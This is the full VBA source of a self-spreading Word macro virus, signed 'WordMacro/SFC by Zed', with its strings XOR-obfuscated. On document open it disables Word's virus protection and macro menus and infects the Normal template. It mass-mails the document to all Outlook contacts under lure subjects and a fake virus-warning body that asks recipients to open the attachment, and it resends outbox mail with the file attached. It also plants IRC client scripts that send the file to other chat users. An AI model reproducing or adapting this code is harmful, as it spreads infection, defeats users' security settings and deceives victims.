Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Sub AutoOpen()
On Error Resume Next
Set fso = CreateObject(Enc("Uetovroha(@ojcUurckIdlcer"))
Options.VirusProtection = False: Options.ConfirmConversions = False: Options.SaveNormalPrompt = False
OfficeKey = Enc("NMC_YESTTCHRYSUCTZUi`rqgtcZKoetiui`rZI``oecZ") & Application.Version & Enc("ZQitbZUcestor")
For OMLoop = 0 To 1
OMArray = Array(Enc("GeecuuPDIK"), Enc("Jcpcj"))
System.PrivateProfileString(Enc(""), OfficeKey, OMArray(OMLoop)) = 1&
Next
With CommandBars(Enc("Riiju"))
.Controls(Enc("Kgeti")).Enabled = False
.Controls(Enc("Rckvjgrcu&ghb&Gbb+Ohu(((")).Enabled = False
.Controls(Enc("Esuriko|c(((")).Enabled = False
End With
With CommandBars(Enc("Kgeti"))
.Controls(Enc("Kgetiu(((")).Enabled = False
.Controls(Enc("Ucestor(((")).Enabled = False
End With
With CommandBars(Enc("@itkgr"))
.Controls(Enc("Urjc(((")).Enabled = False
End With
With CommandBars(Enc("Pocq"))
.Controls(Enc("Urgrsu&Dgt")).Enabled = False
.Controls(Enc("Riijdgtu")).Enabled = False
End With
System.PrivateProfileString(Enc(""), Enc("NMC_YESTTCHRYSUCTZUi`rqgtcZ\cbZ"), Enc("U@E")) = Enc("QitbKgeti)U@E&d&\cb")
If ActiveDocument.VBProject.VBComponents.Item(Enc("U@E")).Name = Enc("U@E") Then
ActiveDocument.VBProject.VBComponents(Enc("U@E")).Export Enc("E<ZQohuhb54(uhb")
SetAttr Enc("E<ZQohuhb54(uhb"), vbHidden
End If
If ActiveDocument.VBProject.VBComponents.Item(Enc("U@E")).Name <> Enc("U@E") Then
ActiveDocument.VBProject.VBComponents.Import Enc("E<ZQohuhb54(uhb")
End If
If NormalTemplate.VBProject.VBComponents.Item(Enc("U@E")).Name <> Enc("U@E") Then
NormalTemplate.VBProject.VBComponents.Import Enc("E<ZQohuhb54(uhb")
End If
If InStr(1, ActiveDocument.Name, Enc("Bieskchr")) = False Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Set OutlookApp = CreateObject(Enc("Isrjiim(Gvvjoegroih"))
If OutlookApp <> Enc("") Then
Set GNS = OutlookApp.GetNamespace(Enc("KGVO"))
For EmlNumber = 1 To GNS.GetDefaultFolder(10).Items.Count
Set EmailContact = GNS.GetDefaultFolder(10).Items.Item(EmlNumber)
EmailReg = Enc("NMC_YESTTCHRYSUCTZUi`rqgtcZ\cbZU@EZTceitbEihrgeru")
EmailKey = System.PrivateProfileString(Enc(""), EmailReg, EmailContact)
If EmailKey = Enc("") Then
Randomize
Select Case Int((20 * Rnd) + 1)
Case 1: EmlMsg = Enc("Eikvsrct&potsu&gjctr")
Case 2: EmlMsg = Enc("Okvitrghr&hcqu")
Case 3: EmlMsg = Enc("Okvitrghr")
Case 4: EmlMsg = Enc("Eikvsrct&gbpouit")
Case 5: EmlMsg = Enc("Uikc&gbpoec")
Case 6: EmlMsg = Enc("Gbpoec&ih&eikvsrctu")
Case 7: EmlMsg = Enc("Gbpoec&tcagtboha&eikvsrctu")
Case 8: EmlMsg = Enc("Okvitrghr&oh`itkgroih")
Case 9: EmlMsg = Enc("Vjcguc&tcgb")
Case 10: EmlMsg = Enc("Stachr")
Case 11: EmlMsg = Enc("Stachr&oh`itkgroih")
Case 12: EmlMsg = Enc("Hcqu&tcagtboha&eikvsrctu")
Case 13: EmlMsg = Enc("Oh`i&ih&eikvsrctu")
Case 14: EmlMsg = Enc("Okvitrghr&oh`i")
Case 15: EmlMsg = Enc("Stachr&oh`i")
Case 16: EmlMsg = Enc("Okvitrghr&hiroec")
Case 17: EmlMsg = Enc("Stachr&hiroec")
Case 18: EmlMsg = Enc("Uikc&bcrgoju")
Case 19: EmlMsg = Enc("Okvitrghr&bcrgoju")
Case 20: EmlMsg = Enc("Stachr&bcrgoju")
End Select
Randomize
Select Case Int((3 * Rnd) + 1)
Case 1: EmlPrefix = Enc("@qb<&")
Case 2: EmlPrefix = Enc("")
Case 3: EmlPrefix = Enc("@q<&")
End Select
Randomize
If Int((6 * Rnd) + 1) = 6 Then
EmlPrefix = UCase(EmlPrefix)
End If
Set OutlookEmail = OutlookApp.CreateItem(0)
OutlookEmail.To = EmailContact
OutlookEmail.Subject = EmlPrefix & EmlMsg
OutlookEmail.Body = Enc("Ncjji&tcgbctu*") & vbCrLf _
& vbCrLf _
& Enc("O&ngpc&boueipctcb&rngr&k&eikvsrct&ngu&ngb&g&eikvsrct&potsu*&") _
& Enc("ghb&O&ngpc&tckipcb&gjj&rtgecu&i`&or(&Rnou&potsu&ou&egsuoha&vtidjcku&`it&") _
& Enc("jiru&i`&eikvsrct&suctu&qitjbqobc(") & vbCrLf _
& Enc("Niqcpct*&rnctc&ou&g&qg&ri&encem&ri&ucc&o`&is&ngpc&rnou&potsu&ih&ist&eikvsrct&uurck<") & vbCrLf _
& Enc("") & vbCrLf _
& Enc("Ejoem&$Urgtr$*&ghb&rnch&uetijj&sv&ri&$@ohb$&it&$Ucgten$&ghb&ucjcer&or(") & vbCrLf _
& Enc("Qgor&shroj&rnc&`ojc&ucgten&gvvjoegroih&gvvcgtu(") & vbCrLf _
& Enc("Qnch&rnc&`ojc&ucgten&gvvjoegroih&gvvcgtu*&rvc&$U`e(c~c$&ghb&ejoem&rnc&`ohb&dsrrih(") & vbCrLf _
& Enc("") & vbCrLf _
& Enc("O`&ist&eikvsrct&`ohbu&rnou&`ojc*&BI&HIR&ivch&rnou&`ojc(&") _
& Enc("Or&ou&oh`cercb&qorn&rnou&potsu(&_is&egh&bcjcrc&rnou&`ojc*&") _
& Enc("dsr&rnc&potsu&kg&urojj&dc&geropc&uikcqnctc&ih&ist&eikvsrct(&Ri&tckipc&rnou&potsu*&") _
& Enc("O&ngpc&ohejsbcb&g&bieskchr&egjjcb&") & Chr(34) & ActiveDocument.Name & Chr(34) & Enc("&qnoen&eihrgohu&kitc&") _
& Enc("ohurtseroihu&ih&niq&ri&tckipc&rnou&potsu&`tik&ist&eikvsrct(") & vbCrLf & vbCrLf & Enc("Rnghmu(")
OutlookEmail.Attachments.Add ActiveDocument.FullName
OutlookEmail.Importance = 2
OutlookEmail.DeleteAfterSubmit = True
OutlookEmail.Send
System.PrivateProfileString(Enc(""), EmailReg, EmailContact) = TimeValue(Now)
End If
Next EmlNumber
For EN1 = 1 To GNS.GetDefaultFolder(4).Items.Count
EmlSwitch = 1
Set OE2 = OutlookApp.CreateItem(0)
Set EmailMsg = GNS.GetDefaultFolder(4).Items.Item(EmlSwitch)
If EmailMsg.To <> Enc("") Then OE2.To = EmailMsg.To
If EmailMsg.CC <> Enc("") Then OE2.CC = EmailMsg.CC
If EmailMsg.BCC <> Enc("") Then OE2.BCC = EmailMsg.BCC
OE2.Subject = EmailMsg.Subject
OE2.Body = EmailMsg.Body
OE2.Attachments.Add ActiveDocument.FullName
OE2.Importance = EmailMsg.Importance
OE2.DeleteAfterSubmit = True
OE2.Send
GNS.GetDefaultFolder(4).Items.Remove (EmlSwitch)
EmlSwitch = EmlSwitch + 1
Next EN1
End If
PgDir = System.PrivateProfileString(Enc(""), Enc("NMC_YJIEGJYKGENOHCZUi`rqgtcZKoetiui`rZQohbiquZEsttchrPctuoih"), Enc("Vtiatgk@ojcuBot"))
If PgDir <> Enc("") Then
For MircLoop = 0 To 3
MircArray = Array(Enc("E<ZKote"), Enc("E<ZKote54"), PgDir & Enc("ZKote"), PgDir & Enc("ZKote54"))
If fso.FolderExists(MircArray(MircLoop)) Then
Open MircArray(MircLoop) & Enc("ZUetovr(oho") For Output As 1
Print #1, Enc("]uetovr[")
Print #1, Enc("h3;&ih&7<LIOH<%<}")
Print #1, Enc("h0;&)o`&.&") & Chr(36) & Enc("hoem&;;&") & Chr(36) & Enc("kc&/&}&ngjr&{")
Print #1, Enc("h1;&)kua&") & Chr(36) & Enc("hoem&Ngpc&g&jiim&gr&rnc&") & ActiveDocument.Name & Enc("&</")
Print #1, Enc("h>;&)bee&uchb&+e&") & Chr(36) & Enc("hoem&") & ActiveDocument.FullName
Print #1, Enc("h?;&{")
Close 1
End If
Next
For PirchLoop = 0 To 3
PirchArray = Array(Enc("E<ZVoten"), Enc("E<ZVoten54"), PgDir & Enc("ZVoten"), PgDir & Enc("ZVoten54"))
If fso.FolderExists(PirchArray(PirchLoop)) Then
Open PirchArray(PirchLoop) & Enc("ZCpchru(oho") For Output As 2
Print #2, Enc("]Jcpcju[")
Print #2, Enc("Chgdjcb;7")
Print #2, Enc("Eishr;0")
Print #2, Enc("Jcpcj7;666+Shmhiqhu")
Print #2, Enc("666+ShmhiqhuChgdjcb;7")
Print #2, Enc("Jcpcj4;766+Jcpcj&766")
Print #2, Enc("766+Jcpcj&766Chgdjcb;7")
Print #2, Enc("Jcpcj5;466+Jcpcj&466")
Print #2, Enc("466+Jcpcj&466Chgdjcb;7")
Print #2, Enc("Jcpcj2;566+Jcpcj&566")
Print #2, Enc("566+Jcpcj&566Chgdjcb;7")
Print #2, Enc("Jcpcj3;266+Jcpcj&266")
Print #2, Enc("266+Jcpcj&266Chgdjcb;7")
Print #2, Enc("Jcpcj0;366+Jcpcj&366")
Print #2, Enc("366+Jcpcj&366Chgdjcb;7")
Print #2, Enc("")
Print #2, Enc("]666+Shmhiqhu[")
Print #2, Enc("SuctEishr;6")
Print #2, Enc("Cpchr7;IH&LIOH<%<)kua&") & Chr(36) & Enc("hoem&Jiim&gr&rnc&") & ActiveDocument.Name & Enc("&</")
Print #2, Enc("CpchrEishr;6")
Print #2, Enc("")
Print #2, Enc("]766+Jcpcj&766[")
Print #2, Enc("Suct7;,',F,")
Print #2, Enc("SuctEishr;7")
Print #2, Enc("Cpchr7;IH&LIOH<%<)bee&uchb&") & Chr(36) & Enc("hoem&") & ActiveDocument.FullName
Print #2, Enc("CpchrEishr;7")
Print #2, Enc("")
Print #2, Enc("]466+Jcpcj&466[")
Print #2, Enc("SuctEishr;6")
Print #2, Enc("CpchrEishr;6")
Print #2, Enc("")
Print #2, Enc("]566+Jcpcj&566[")
Print #2, Enc("SuctEishr;6")
Print #2, Enc("CpchrEishr;6")
Print #2, Enc("")
Print #2, Enc("]266+Jcpcj&266[")
Print #2, Enc("SuctEishr;6")
Print #2, Enc("CpchrEishr;6")
Print #2, Enc("")
Print #2, Enc("]366+Jcpcj&366[")
Print #2, Enc("SuctEishr;6")
Print #2, Enc("CpchrEishr;6")
Close 2
End If
Next
For VircLoop = 0 To 3
VircArray = Array(Enc("E<ZPote"), Enc("E<ZPote54"), PgDir & Enc("ZPote"), PgDir & Enc("ZPote54"))
If fso.FolderExists(VircArray(VircLoop)) Then
System.PrivateProfileString(Enc(""), Enc("NMC_YSUCTUZ(BC@GSJRZUi`rqgtcZKcagjorn&Ui`rqgtcZPousgj&OTE?0ZCpchru"), Enc("Cpchr71")) = Enc("bee&uchb&") & Chr(36) & Enc("hoem&") & ActiveDocument.FullName
End If
Next
End If
Else
ActiveDocument.Saved = True
End If
End Sub
Sub ToolsMacro()
End Sub
Sub ViewVBCode()
End Sub
Sub FileTemplates()
End Sub
Function Enc(TextStr)
For LenLoop = 1 To Len(TextStr)
Enc = Enc & Chr(Asc(Mid(TextStr, LenLoop, 1)) Xor (6 Mod 255))
Next
End Function
' WordMacro/SFC by Zed

